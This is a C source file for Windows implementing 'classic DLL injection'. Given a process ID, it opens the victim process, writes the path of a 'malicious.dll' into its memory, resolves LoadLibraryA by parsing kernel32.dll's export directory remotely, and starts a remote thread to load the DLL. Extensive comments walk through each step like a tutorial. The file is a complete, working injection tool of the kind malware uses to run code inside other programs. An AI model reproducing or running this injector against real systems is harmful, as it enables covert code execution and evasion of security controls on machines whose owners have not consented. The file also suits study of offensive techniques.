#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

int main(int argc, char* argv[])
{
	unsigned int victimProcessId;

	if (argc > 1)
	{
		/*
		The function atoi() isn't the best solution for converting a char pointer to integer,
		as it will convert any invalid number to 0.
		A better solution is described here: https://stackoverflow.com/questions/2797813/how-to-convert-a-command-line-argument-to-int
		*/
		victimProcessId = atoi(argv[1]);
		printf("[+] Performing Classic DLL Injection inside the victim process identified by the PID: %d\n", victimProcessId);
	}
	else
	{
		printf("[+] Usage:\n\tprogram.exe PID\n");
		return 1;
	}

	/*
	Use OpenProcess to get a handle to the victim process.
	In this case, I'm using the process access right PROCESS_VM_WRITE (value: 0x20), because
	I want to write some memory inside that process.
	*/
	DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
	HANDLE victimProcessHandle = OpenProcess(
		desiredAccess,								// PROCESS_VM_OPERATION is enough for a successful call to VirtualAllocEx
													// however WriteProcessMemory also requires PROCESS_VM_WRITE according to the docs
													// CreateRemoteThread also requires PROCESS_VM_READ, PROCESS_CREATE_THREAD, 
													// and PROCESS_QUERY_INFORMATION
		NULL,										// whether the processes created by this process can inherit this handle
													// in this case it's NULL, so no inheritance
		victimProcessId);							// open this specific process

	/*
	According to the official documentation, OpenProcess returns NULL if it fails to get a handle
	Ref: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	*/
	if (victimProcessHandle == NULL)
	{
		printf("[!] Call to OpenProcess failed\n");

		/*
		According to the official documentation, you can use the function GetLastError() to get
		extended error information
		Ref: https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror
		*/
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully created a handle for the victim process\n");
	}

	/*
	Allocate some space inside the memory of the victim process.
	Later, it will store the absolute path of the malicious DLL library.
	For more information regarding the arguments of VirtualAllocEx:
	https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	*/
	LPVOID allocatedMemory = VirtualAllocEx(
		victimProcessHandle,					// reserve a new memory page inside the victim process
		NULL,									// we don't care where to allocate the memory
		4096,									// allocate 4096 bytes
		MEM_COMMIT | MEM_RESERVE,				// commit and reserve memory in one step
		PAGE_READWRITE);						// set the memory page as readable/writable

	if (allocatedMemory == NULL)
	{
		printf("[!] Call to VirtualAllocEx failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully allocated some memory in the victim process\n");
		printf("[+] Starting address: %p\n", allocatedMemory);
	}

	/*
	Path to the malicious DLL library to inject in the victim process.
	An alternative is to use a command-line argument (argv[1]).
	*/
	char maliciousLibrary[] = "C:\\Users\\rbct\\Desktop\\malicious.dll";

	/*
	Now that we have defined the path of the malicious DLL, we have to
	copy it into the memory of the victim process.
	We can use the space allocated by VirtualAllocEx.
	*/
	BOOL retVal = WriteProcessMemory(
		victimProcessHandle,			// handle to the process in which to the write the bytes
		allocatedMemory,				// starting address where to write the bytes
		maliciousLibrary,				// buffer containing the bytes to write
		strlen(maliciousLibrary),		// number of bytes to write, in this case: the size of the path
		NULL);							// pointer to variable which will contain the number of bytes written
										// in this case, we don't really need it

	if (retVal == 0)
	{
		printf("[!] Call to WriteProcessMemory failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());

		return 1;
	}
	else
	{
		printf("[+] Successfully wrote the path of the DLL inside the allocated memory space\n");
	}

	/*
	To get the address of LoadLibraryA (which resides inside the module kernel32.dll), we're going to look
	at the Export Address Table of the module.
	We can't simply get the address of LoadLibraryA inside the current process, and then
	subtract the base address of the module, as the offset would be different when injecting
	from a 32-bit process to a 64-bit one, or viceversa.
	*/
	HANDLE handleToolhelpSnapshot = CreateToolhelp32Snapshot(
		TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,		// create a snapshot of any modules (64-bit or 32-bit)
														// loaded by the victim process
		victimProcessId									// process ID of the victim process
	);

	if (handleToolhelpSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[!] Call to CreateToolhelp32Snapshot failed\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());
		return 1;
	}
	else
	{
		printf("[+] Successfully managed to get a handle to a snapshot for the victim process: %d\n", handleToolhelpSnapshot);
	}

	/*
	According to the official documentation, "the calling application must set the dwSize member
	of MODULEENTRY32 to the size, in bytes, of the structure".
	*/
	MODULEENTRY32 moduleStructure;
	moduleStructure.dwSize = sizeof(MODULEENTRY32);

	/*
	Check the name of the first module loaded by the victim process.
	*/
	retVal = Module32First(handleToolhelpSnapshot, &moduleStructure);
	if (retVal != TRUE)
	{
		printf("[!] Call to Module32First failed. Couldn't retrieve the first module loaded by the victim process\n");
		printf("[!] Specific Win32 error: %d\n", GetLastError());
		return 1;
	}
	else
	{
		printf("[+] Successfully retrieved the first module loaded by the victim process\n");
		printf("\t- Module: %s\n", moduleStructure.szModule);
		printf("\t- Offset: 0x%p\n", moduleStructure.modBaseAddr);
	}

	/*
	Loop through the modules loaded by the victim process.
	If the module (converted ot lowercase) is kernel32.dll, then break out of the loop.
	*/
	while (Module32Next(handleToolhelpSnapshot, &moduleStructure) == TRUE)
	{
		/*
		Loop for converting the name of the module to lowercase.
		*/
		for (int i = 0; i < strlen(moduleStructure.szModule); i++)
		{
			moduleStructure.szModule[i] = tolower(moduleStructure.szModule[i]);
		}

		if (strstr(moduleStructure.szModule, "kernel32.dll"))
		{
			printf("[+] Found the base address of the module kernel32.dll in the victim process: %p\n", moduleStructure.modBaseAddr);
			break;
		}
	}

	/*
	Read 4 bytes starting from the offset 0x3c.
	These bytes represent the field 'e_lfanew' of the DOS header, i.e. the offset of the NT Headers.
	We're going to use the NT Headers (in particular the fifth and sixth bytes) to determine the
	bitness of the module.
	This in turn will allow us to determine what structures to use (32-bit version on 64-bit).
	*/
	DWORD offsetNtHeaders;
	ReadProcessMemory(
		victimProcessHandle,					// handle to the target process
		moduleStructure.modBaseAddr + 0x3c,		// starting address of the bytes to read
		&offsetNtHeaders,						// where to store the bytes read from the victim process
		4,										// how many bytes to read
		NULL);									// pointer to variable which will contain the number of bytes read
												// but we don't need it
	printf("[+] Offset to NT Headers from base address of the module: 0x%x\n", offsetNtHeaders);

	/*
	Read the 5th and 6th bytes (field Machine of the struct IMAGE_FILE_HEADER stored inside
	the struct IMAGE_NT_HEADER.
	As mentioned previosuly, this value specifies the bitness of the module (32-bit or 64-bit).
	*/
	WORD moduleFileHeaderMachine;
	ReadProcessMemory(
		victimProcessHandle,
		moduleStructure.modBaseAddr + offsetNtHeaders + 4,
		&moduleFileHeaderMachine,
		2,
		NULL);

	BOOL moduleIs64Bit = FALSE;
	printf("[+] Value stored in the field 'Machine' of the NT headers of the kernel32.dll module: 0x%x\n", moduleFileHeaderMachine);
	
	/*
	Check the bitness of the module kernel32.dll loaded by the victim process.
	If the value of the field 'Machine' is equal to 0x200 (Intel Itanium) or 0x8664 (x86-64),
	then it's 64-bit, otherwise it's 32-bit.
	Reference: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header
	*/
	if (moduleFileHeaderMachine == 0x8664 || moduleFileHeaderMachine == 0x200)
	{
		moduleIs64Bit = TRUE;
		printf("[+] Module kernel32.dll loaded by the victim process is 64-bit\n");
	}
	else
	{
		printf("[+] Module kernel32.dll loaded by the victim process is 32-bit\n");
	}	

	/*
	Based on the official documentation, the optional header is the third field inside the
	struct IMAGE_NT_HEADERS (both 32-bit and 64-bit).
	Reference: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32
	Therefore, to calculate it, I'm adding up the following values:
	- base address of the module (kernel32.dll)
	- offset of the NT Headers
	- size of the signature (4 bytes, usually containing the value 0x50450000, i.e. "PE"
	- size of the File Header, which is different based on the bitness (64-bit or 32-bit) of the module
	*/
	PVOID optionalHeaderOffset = moduleStructure.modBaseAddr + offsetNtHeaders + sizeof(IMAGE_FILE_HEADER) + 4;

	/*
	Based on the bitness, the function ReadProcessMemory will read the appropriate number
	of bytes from the victim process and will populate the struct IMAGE_OPTIONAL_HEADER64
	(or IMAGE_OPTIONAL_HEADER32).
	*/
	DWORD exportDirectoryAddressOffset;
	DWORD exportDirectorySize;
	if (moduleIs64Bit)
	{
		IMAGE_OPTIONAL_HEADER64 imageOptionalHeader;
		ReadProcessMemory(
			victimProcessHandle,
			optionalHeaderOffset,
			&imageOptionalHeader,
			sizeof(IMAGE_OPTIONAL_HEADER64),
			NULL);
		
		/*
		Based on the official documentation, the Optional Header contains a field named 'DataDirectory'.
		It's an array made out of 16 elements, containing things like the Export Directory, Import Directory,
		Import Address Table, Base Relocation table, etc.
		The Export Table (i.e. the Export Address Table) is the element stored at the index IMAGE_DIRECTORY_ENTRY_EXPORT,
		which is equal to 0, hence it's the first element in the array.
		Reference: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32

		Each element is a IMAGE_DATA_DIRECTORY structure, containing two fiels:
		- VirtualAddress (offset of the the table, starting from the base address of the module)
		- Size (size of the table, in bytes)
		Reference: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory
		*/
		exportDirectoryAddressOffset = imageOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		exportDirectorySize = imageOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		printf("[+] Offset of the Export Directory of the module kernel32.dll in the victim process: %p\n", exportDirectoryAddressOffset);
	}
	else
	{
		IMAGE_OPTIONAL_HEADER32 imageOptionalHeader;
		ReadProcessMemory(
			victimProcessHandle,
			optionalHeaderOffset,
			&imageOptionalHeader,
			sizeof(IMAGE_OPTIONAL_HEADER32),
			NULL);

		exportDirectoryAddressOffset = imageOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		exportDirectorySize = imageOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		printf("[+] Offset of the Export Directory of the module kernel32.dll in the victim process: %p\n", exportDirectoryAddressOffset);
	}

	/*
	Now that we have the offset of the Export Directory and its size, we can
	copy it inside this proces, so we won't need to call ReadProcessMemory for
	each exported functions.
	To do this we need a dynamic byte array, which means we need to allocate
	some space on the Heap.
	To do this:
	1. get the handle to the current heap
	2. allocate the needed space, zeroing all the bytes
	*/
	HANDLE handleHeap = GetProcessHeap();
	PVOID allocatedHeapMemoryAddress = HeapAlloc(handleHeap, HEAP_ZERO_MEMORY, exportDirectorySize);

	if (allocatedHeapMemoryAddress == NULL)
	{
		printf("[!] Failed to allocated space on the heap for the export directory\n");
		return 1;
	}
	else
	{
		printf("[+] Successfully allocated some space on the heap for the export directory\n\t- Address: %p\n", allocatedHeapMemoryAddress);
	}

	/*
	Now that we've successfully allocated enough Heap memory, we can copy all the bytes
	of the Export Directory and store them in this memory area.
	*/
	ReadProcessMemory(
		victimProcessHandle,
		moduleStructure.modBaseAddr + exportDirectoryAddressOffset,
		allocatedHeapMemoryAddress,
		exportDirectorySize,
		NULL);

	/*
	Populate the structure IMAGE_EXPORT_DIRECTORY with the first bytes of the
	export directory, which at the moment are located on the heap.
	We'll need this structure to retrieve the offset of the names/address of the
	exported functions.
	*/
	IMAGE_EXPORT_DIRECTORY imageExportDirectory;
	CopyMemory(
		&imageExportDirectory,				// pointer to variable/struct to populate
		allocatedHeapMemoryAddress,			// pointer to the source buffer
		sizeof(IMAGE_EXPORT_DIRECTORY));	// number of bytes to copy from the source buffer

	int numExportedFunctions = imageExportDirectory.NumberOfFunctions;
	printf("[+] Num. of functions exported by the module kernel32.dll loaded by the victim process: 0x%x (%d)\n", numExportedFunctions, numExportedFunctions);

	/*
	Calculate the absolute addresses (in the current process, since we copied the entire Export Directory)
	- addressExportFunctionsNames -> absolute address of the Relative Virtual Address (RVA) of the name
		of the first function
	- addressExportFunctions -> absolute address of the Relative Virtual Address (RVA) of the code
		of the first function
	By RVA, we mean an offset starting from the base address of the module (kernel32.dll)
	*/
	ULONG_PTR addressExportFunctionsNames = ((ULONG_PTR)allocatedHeapMemoryAddress) + 
		(imageExportDirectory.AddressOfNames - exportDirectoryAddressOffset);
	ULONG_PTR addressExportFunctions = ((ULONG_PTR)allocatedHeapMemoryAddress) +
		(imageExportDirectory.AddressOfFunctions - exportDirectoryAddressOffset);
	
	ULONG_PTR offsetExportFunctionName;
	ULONG_PTR addressExportFunctionName;
	ULONG_PTR targetFunctionAddress;
	ULONG_PTR targetFunctionRVA;

	char targetFunctionName[] = "LoadLibraryA";
	
	/*
	Loop through all the exported functions from the target module (kernel32.dll).
	There should be about 1600 functions to check.
	*/
	for (int i = 0; i < numExportedFunctions; i++)
	{

		/*
		Copy the Relative Virtual Address (RVA) of the function name, so we can
		retrieve it and compare it with the string 'LoadLibraryA'.
		*/
		CopyMemory(
			&offsetExportFunctionName,
			(PVOID)(addressExportFunctionsNames + (i * 4)),
				4);

		/*
		Calculating the absolute address of the function name.
		Since we copied the entire Export Directory from the victim process,
		there's no need to call ReadProcessMemory for each function.
		The absolute address of the function name resides in the Heap
		of the current process.
		*/
		addressExportFunctionName = ((ULONG_PTR)allocatedHeapMemoryAddress) +
			offsetExportFunctionName - exportDirectoryAddressOffset;

		/*
		Checking if the name of the exported function is equal to "LoadLibraryA".
		*/
		if (strcmp(targetFunctionName, (const char *)addressExportFunctionName) == 0)
		{
			printf("[+] Function name: %s\n", addressExportFunctionName);

			/*
			Copy the RVA, which is 4-bytes long, of the target function (LoadLibraryA)
			into the variable 'targetFunctionRVA'.
			*/
			CopyMemory(
				&targetFunctionRVA,
				(PVOID)(addressExportFunctions + (i * 4)),
				4);

			printf("[+] Relative Virtual Address of the target Export Function: %p\n", targetFunctionRVA);

			/*
			Now that we have the RVA of LoadLibraryA, we can calculate its absolute address
			(in the memory of the victim process).
			*/
			targetFunctionAddress = (ULONG_PTR)(moduleStructure.modBaseAddr + targetFunctionRVA);
			printf("[+] Absolute Virtual Address of the target Export Function in the victim process: %p\n", targetFunctionAddress);

			break;
		}
	}

	/*
	Now that we have the absolute address of the target function (LoadLibraryA)
	we're ready to create a new thread in the victim process, in order to load
	malicious DLL (path copied with WriteProcessMemory).
	*/
	HANDLE remoteThread = CreateRemoteThread(
		victimProcessHandle,								// handle to the victim process
		NULL,												// pointer to SECURITY_ATTRIBUTES struct
															// can be null if we want default security attributes
		0,													// size of the stack, 0 for default
		(LPTHREAD_START_ROUTINE)targetFunctionAddress,		// starting address of the thread
															// in this case, the address of LoadLibraryA
		allocatedMemory,									// pointer to a variable to be passed to the thread function
															// in this case, the address of the path of the malicious DLL
		0,													// flags to manipulate the creation of the thread
															// (e.g. start suspended)
															// in this case, 0 -> start thread immediately
		NULL);												// pointer to a variable that receives the thread identifier
															// we don't need it, so it's set to NULL

	if (remoteThread == NULL)
	{
		printf("[!] Couldn't create the remote thread. Error: %d\n", GetLastError());
		return 1;
	}
	else
	{
		printf("[+] Remote thread create. The DLL should be loaded right now...");
	}

	/*
	You can use WaitForSingleObject in order to wait for the remote thread to finish,
	before terminating the current program.
	*/
	WaitForSingleObject(remoteThread, INFINITE);

	/*
	Free the Heap memory allocated previously.
	*/
	HeapFree(handleHeap, NULL, allocatedHeapMemoryAddress);

	return 0;
}
